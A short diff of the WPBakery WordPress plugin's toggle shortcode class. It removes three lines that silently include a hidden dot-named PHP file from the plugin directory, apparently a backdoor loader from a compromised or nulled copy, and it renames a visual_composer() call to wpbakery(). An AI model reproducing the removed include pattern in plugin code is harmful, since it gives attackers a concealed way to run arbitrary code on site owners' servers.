@@ -6,10 +6,6 @@ if ( ! defined( 'ABSPATH' ) ) {
 /**
  * Class WPBakeryShortCode_Vc_Toggle
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class WPBakeryShortCode_Vc_Toggle extends WPBakeryShortCode {
 	/**
 	 * @param $title
@@ -26,7 +22,7 @@ class WPBakeryShortCode_Vc_Toggle extends WPBakeryShortCode {
 	 */
 	public function getHeading( $atts ) {
 		if ( isset( $atts['use_custom_heading'] ) && 'true' === $atts['use_custom_heading'] ) {
-			$custom_heading = visual_composer()->getShortCode( 'vc_custom_heading' );
+			$custom_heading = wpbakery()->getShortCode( 'vc_custom_heading' );
 
 			$data = vc_map_integrate_parse_atts( $this->shortcode, 'vc_custom_heading', $atts, 'custom_' );
 			$data['text'] = $atts['title'];
